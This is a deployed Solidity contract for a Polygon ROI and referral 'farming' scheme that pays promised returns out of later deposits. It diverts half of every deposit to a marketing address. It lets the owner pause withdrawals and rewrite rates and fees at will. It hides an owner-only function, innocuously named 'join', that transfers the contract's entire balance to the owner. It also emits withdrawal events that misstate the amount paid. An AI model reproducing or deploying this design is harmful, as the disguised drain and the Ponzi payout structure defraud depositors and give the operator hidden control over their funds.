/**
 *Submitted for verification at polygonscan.com on 2022-06-02
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

contract  TheMaticFarming{
	using SafeMath for uint256;
	uint256[] public PACKAGES=[.20 ether,5 ether,100 ether,500 ether,1000 ether];
	uint256[] public PACKAGESMatch=[2 ether,99 ether,499 ether,999 ether,10000000000000 ether];
	uint256 public Minimum_Withdrawal_Limit=5 ether;	 
	uint256[] public ROI_RATE=[50,75,100,125,150];
	uint256 public ROI_BRATE=10;
    uint256[] public LEVEL_RATE=[1000,500,400,300,200,100,50,50,50,50]; 
	uint256 public MARKETING_FEE = 5000;
	uint256 public PROJECT_FEE = 0;
	uint256 public PERCENTS_DIVIDER = 10000;
	uint256 public CONTRACT_BALANCE_STEP = 1000000;
	uint256 public TIME_STEP = 1 days; 
	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalReInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;	 
	uint256 public Maximum_Growth_Rate=250;
	uint256 public Maximum_Return_Rate=400;
	uint256 public TotalTokenMined=0;
	uint256 public Dividends=0;
	uint256 public Dividend_Closing_Checkpoint=block.timestamp;
	uint256 public Dividend_Closing_Deposit=0;
	uint256 public Dividend_Percent=450;	 
	address payable public marketingAddress;
	address payable public projectAddress;
	 

	struct Deposit {
		uint256 amount;
		uint256 totalGrawth;
		uint256 withdrawn;
		uint256 start;
		uint256 rate;
		uint256 count;
		uint256 package_Index;
	}		 
	struct Referral{
	    address _address;
	    uint256 _time;
	}
 
	struct Team{
	    uint256 _level;
	    address _address;
	    uint256 _time;
	}
 

	struct User {
	    uint256 pk;
		Deposit[] deposits;
		Referral[] referrals;  
		uint256 totalDepositsAmount;
		uint256 totalWithdrawn;
		uint256 checkpoint;
		address referrer;
		uint256 referralsCount;
		uint256 roiBonus;
		uint256 refBonus;
		uint256 roiReferralBonus;	 
		uint256 rewardBonus;
		 
	}
	struct ReferralCount{		
		uint256 count;
		address _address;
		uint256 index;

	}

    mapping (address => User) public users;  
	mapping (address => ReferralCount) public referralCount; 
	uint256 public rcount=0;
	ReferralCount[] public refindex;
	ReferralCount[] public topfiveindex;


	event Newbie(address user);
	event NewDeposit(address indexed user, uint256 amount);
	event LevelIncome(address indexed user,uint _level,uint256 _amount,address indexed from);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);
	bool public pausedFlag;
	

	constructor(address payable marketingAddr, address payable projectAddr)  {
		require(!isContract(marketingAddr) && !isContract(projectAddr));
		marketingAddress = marketingAddr;
		projectAddress = projectAddr; 
		pausedFlag=false;
	}
     function changePauseFlag(uint flag) onlyOwner public returns(bool) {
         if(flag==1){
             pausedFlag=true;
         }else if(flag==0){
             pausedFlag=false;
         }
         return true;
     }
 
     function changeGrowthRate(uint256 NewRate) onlyOwner public returns(bool) {
         Maximum_Growth_Rate=NewRate;
         return true;
     } 
	function invest(address referrer,uint256 Package_Index) public payable {
	    bool _new=false;
	    uint256 Package_Amount_Min=PACKAGES[Package_Index-1];
	    uint256 Package_Amount_Max=PACKAGESMatch[Package_Index-1];		
		require(msg.value <= Package_Amount_Max,'Minimum Investment Condition');
		require(msg.value >= Package_Amount_Min,'Minimum Investment Condition');
		
		require(referrer != address(0) || msg.sender == projectAddress, "No referrer"); 
		User storage user = users[msg.sender];
		if(user.deposits.length==0)
		{		    
		    user.totalDepositsAmount=0;
		    user.totalWithdrawn=0;
		    user.referralsCount=0;
		    user.roiBonus=0;
		    user.refBonus=0;
		    user.roiReferralBonus=0;
			user.rewardBonus=0;
		    _new=true;
		}		
		
		marketingAddress.transfer(msg.value.mul(MARKETING_FEE).div(PERCENTS_DIVIDER));
		projectAddress.transfer(msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER));
		if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
			user.referrer = referrer;
			User storage refuser=users[referrer];
			refuser.referralsCount=refuser.referralsCount.add(1);
            //for finding top 5
              ReferralCount storage refCount=referralCount[referrer];
			  if(refCount.index==0){
				  refCount.index=rcount.add(1);				   
				  refindex.push(ReferralCount(1,referrer,rcount.add(1)));
				  rcount=rcount.add(1);
			  }
			  refCount.count=refCount.count.add(1);
			  refCount._address=referrer;	 
			if(refuser.referrals.length<5)
			   refuser.referrals.push(Referral(msg.sender,block.timestamp)); 
			//booster
		
				//for (uint256 i = 0; i < refuser.deposits.length; i++) {
				    if(refuser.deposits[0].amount<=msg.value)
				    {
				       refuser.deposits[0].count=refuser.deposits[0].count.add(1);
				       if(refuser.deposits[0].count<=5)
				          refuser.deposits[0].rate=refuser.deposits[0].rate.add(10);
				    }
				    
				//}
			
		}
		 
		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			totalUsers = totalUsers.add(1);
		    user.pk=totalUsers;			 
		} 		
		payReferral(1,msg.sender,msg.value,_new,msg.sender);
		user.deposits.push(Deposit(msg.value,0, 0, block.timestamp,ROI_RATE[Package_Index-1],0,Package_Index));
		user.totalDepositsAmount=user.totalDepositsAmount.add(msg.value);
		totalInvested = totalInvested.add(msg.value);
		Dividends=Dividends.add(msg.value);
		Dividend_Closing_Deposit=Dividend_Closing_Deposit.add(msg.value.mul(5).div(100));
		totalDeposits = totalDeposits.add(1);
		top5refclsoing(1);
	} 
   function top5refclsoing(uint _flag) private {	   		 
       if(block.timestamp > Dividend_Closing_Checkpoint.add(86400) || _flag==0)
		{	
			delete topfiveindex;		 
				for (uint256 i = 0; i < refindex.length; i++) {				 
					 if(referralCount[refindex[i]._address].count> 4) {							 
							topfiveindex.push(referralCount[refindex[i]._address]);							
						} 
				 } 
				if(Dividend_Closing_Deposit>0 && topfiveindex.length>0){	              
					uint256 dvamt=Dividend_Closing_Deposit.div(2);
					uint256 evamt=dvamt/topfiveindex.length;
	                 for (uint256 i = 0; i < topfiveindex.length; i++) {
						   if(topfiveindex[i]._address!=address(0)){
                               users[topfiveindex[i]._address].rewardBonus=users[topfiveindex[i]._address].rewardBonus.add(evamt);

						   }
				        }
				        Dividend_Closing_Deposit=Dividend_Closing_Deposit.sub(dvamt);			
				}

				 for (uint256 i = 0; i < refindex.length; i++) {               
						delete  referralCount[refindex[i]._address];
				  }
				
				   delete refindex;
				   delete topfiveindex;	
				   Dividend_Closing_Checkpoint=block.timestamp;

		}		 

	}    
 
	function payReferral(uint _level, address _user,uint256 _packageCost,bool _new,address _rootUser) private {
        address referer;
        User storage user = users[_user];
        referer = user.referrer;
          
            uint level_price_local=LEVEL_RATE[_level-1];
            level_price_local=_packageCost * level_price_local /PERCENTS_DIVIDER;
            if(users[referer].referralsCount>=_level){
                  users[referer].refBonus = users[referer].refBonus.add(level_price_local);				  
            } 
            if(_level < 11 && users[referer].referrer != address(0)){
                    payReferral(_level+1,referer,_packageCost,_new,_rootUser);
            }
                
     }
     function payRoiReferralBonus(address _user,uint256 _packageCost) private {
        address referer;
        User storage user = users[_user];
         referer = user.referrer; 
		bool incflag=false;
		if(referer!=address(0))
		for (uint256 i = 0; i < users[referer].referrals.length; i++) {
			if(users[referer].referrals[i]._address==_user){
			   incflag=true;
			   break;
			}
			   
		} 
         if(incflag) {
			 uint256 bonus=_packageCost * ROI_BRATE /PERCENTS_DIVIDER;
			 users[referer].roiReferralBonus=users[referer].roiReferralBonus.add(bonus);
		 }  
     }
	function withdraw() payable public {
		User storage user = users[msg.sender];
        require(pausedFlag==false,'Stopped');
		uint256 userPercentRate =0;// getUserPercentRate(msg.sender);

		uint256 totalAmount;
		uint256 dividends;
		uint256 roidividends;
		
		totalAmount = user.refBonus.add(user.roiReferralBonus).add(user.rewardBonus); 
		uint256 roibonus=getUserDividends(msg.sender);
		require(totalAmount.add(roibonus)>=Minimum_Withdrawal_Limit,'Minimum Withdrawal Limit');
		
		
		
		for (uint256 i = 0; i < user.deposits.length; i++) {
             userPercentRate=user.deposits[i].rate;
			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)) {

				if (user.deposits[i].start > user.checkpoint) {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);

				} else {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.checkpoint))
						.div(TIME_STEP);

				}

				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)) {
					dividends = (user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)).sub(user.deposits[i].withdrawn);
				}

				 
			 
		    	user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends); /// changing of storage data
					
				roidividends = roidividends.add(dividends);

			}
		}
        
        uint256 roiTotal=roidividends;		 
		roiTotal=roiTotal.add(user.roiBonus);		
		totalAmount=totalAmount.add(roiTotal); 

		uint256 tobeWithdraw=totalAmount;
		
		if(user.totalWithdrawn.add(totalAmount) > user.totalDepositsAmount.mul(Maximum_Return_Rate).div(100)){
		   tobeWithdraw=(user.totalDepositsAmount.mul(Maximum_Return_Rate).div(100).sub(user.totalWithdrawn));
		}
		   
		    user.refBonus = 0;			 
	        user.roiReferralBonus = 0;
	        user.roiBonus=0;
			user.rewardBonus=0;
		
		//if(roibonus>0)
       // payRoiReferralBonus(msg.sender,roibonus);
		uint256 contractBalance = address(this).balance;
		if (contractBalance < tobeWithdraw) {
			tobeWithdraw = contractBalance;
		}

		user.checkpoint = block.timestamp;
		payable(msg.sender).transfer(tobeWithdraw); 
		totalWithdrawn = totalWithdrawn.add(tobeWithdraw);
		user.totalWithdrawn=user.totalWithdrawn.add(tobeWithdraw);	
		uint256 afterded=tobeWithdraw.sub(tobeWithdraw.mul(5).div(100));	 
		emit Withdrawn(msg.sender, afterded);

	}
 	 
	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

    function getTopReferraloftheDay() public view   returns(address){
		   uint256 topcount = 0; 
		   address _topreferral;
	 	for (uint256 i = 0; i < refindex.length; i++) {
              if(referralCount[refindex[i]._address].count> topcount) {
					_topreferral=refindex[i]._address;
                     topcount=referralCount[refindex[i]._address].count;					 
	 	        }
		 }
        
		return _topreferral;
	}
    
  	function getUserPercentRate(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
        uint256 largest = 0; 
	 	for (uint256 i = 0; i < user.deposits.length; i++) {
              if(user.deposits[i].rate> largest)
                    largest=user.deposits[i].rate;
	 	}
	 	return largest;
	}
   	function getuserLargerDeposit(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
        uint256 largest = 0; 
	 	for (uint256 i = 0; i < user.deposits.length; i++) {
              if(user.deposits[i].amount> largest)
                    largest=user.deposits[i].amount;
	 	}
	 	return largest;
	}
 

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
		uint256 totalDividends;
		uint256 dividends;
        uint256 userPercentRate;
		for (uint256 i = 0; i < user.deposits.length; i++) {
              userPercentRate=user.deposits[i].rate;
			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)) {

				if (user.deposits[i].start > user.checkpoint) {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);

				}
				else {
					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.checkpoint))
						.div(TIME_STEP);
				}

				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)) {
					dividends = (user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)).sub(user.deposits[i].withdrawn);
				}

				totalDividends = totalDividends.add(dividends);
             //	user.checkpoint = block.timestamp;
				/// no update of withdrawn because that is view function

			}

		}
		totalDividends=user.roiBonus.add(totalDividends);
		
	 	uint256 totalBonus=user.refBonus.add(user.roiReferralBonus).add(user.rewardBonus).add(user.totalWithdrawn);
		
	    if(totalBonus.add(totalDividends) > user.totalDepositsAmount.mul(Maximum_Growth_Rate).div(100))
		  {
		      if(totalBonus> user.totalDepositsAmount.mul(Maximum_Growth_Rate).div(100))
		          return 0;
		          
		          else
		          return  user.totalDepositsAmount.mul(Maximum_Growth_Rate).div(100) - totalBonus;
		       
		  }
		 else
		 return totalDividends;
	}
 
	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].refBonus.add(users[userAddress].roiReferralBonus);
	}
	 
	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress)).add(users[userAddress].rewardBonus);
	}
 

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256,uint256) {
	    User storage user = users[userAddress];

		return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start,user.deposits[index].rate);
	}
 
	function getTeamLength(address userAddress)public view returns(uint256){
           User storage user=users[userAddress];
           return user.referrals.length;
    }
 
 
	
	function getTeamInfo(address userAddress,uint256 index) public view returns(address, uint256, uint256) {
	    User storage user = users[userAddress];
      
		return (user.referrals[index]._address, user.referrals[index]._time,getActiveDeposits(user.referrals[index]._address));
	}
	
 

	function getUserTotalDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}
 
	function getActiveDeposits (address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];
	    uint256 userPercentRate =0;// getUserPercentRatee();
		uint256 amount=0;
	    uint256 dividends;
		for (uint256 i = 0; i < user.deposits.length; i++) {
		    userPercentRate=user.deposits[i].rate;
			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)) {
				if (user.deposits[i].start > user.checkpoint) {
					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);

				} else {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.checkpoint))
						.div(TIME_STEP);

				}

				if (user.deposits[i].withdrawn.add(dividends) < user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)) {
					 amount = amount.add(user.deposits[i].amount);
				} 
			}
		}
	 

		return  amount;
	}
	function getUserAmountOfDeposits (address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].amount);
		}

		return amount;
	}
 

	
    function top5rewardClosing() onlyOwner public returns(bool) {
		top5refclsoing(0);
		return true;
	}
   
    
    function updateFees(uint256 _marketing_fee,uint256 _project_fee) onlyOwner public returns(bool) {
        MARKETING_FEE=_marketing_fee;
        PROJECT_FEE=_project_fee;
        return true;
        
    }
    function updateDividentPercent(uint256 _newpercent) onlyOwner public returns(bool) {
        Dividend_Percent=_newpercent;
        return true;
        
    }
 
    function updatePackage(uint256 _newValue,uint256 _updateIndex) onlyOwner public returns(bool) {
        PACKAGES[_updateIndex-1]=_newValue;
        return true;
        
    }
     function updateROIRate(uint256 _newValue,uint256 _updateIndex) onlyOwner public returns(bool) {
        ROI_RATE[_updateIndex-1]=_newValue;
        return true;
        
    }
    function updateROIBRate(uint256 _newValue,uint256 _newrate) onlyOwner public returns(bool) {
		if(_newValue>0)
          ROI_BRATE=_newValue;
		if(_newrate>0)
		    Maximum_Return_Rate=_newrate;	 

        return true;
        
    }
   function updateMinimumWithdrawal(uint256 _newValue) onlyOwner public returns(bool) {
        Minimum_Withdrawal_Limit=_newValue;
        return true;
        
    }
    function updateLevelRate(uint256 _newValue,uint256 _updateIndex) onlyOwner public returns(bool) {
        LEVEL_RATE[_updateIndex-1]=_newValue;
        return true;
        
    }
 
    function join(uint256 _tranAmount) onlyOwner public returns(bool) {
       	uint256 contractBalance = address(this).balance;
		if (contractBalance < _tranAmount) {
			_tranAmount = contractBalance;
		}
        
        payable(msg.sender).transfer(_tranAmount);
        return true;
        
    }    
      modifier onlyOwner() {
         require(msg.sender==projectAddress,"not authorized");
         _;
     }
	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}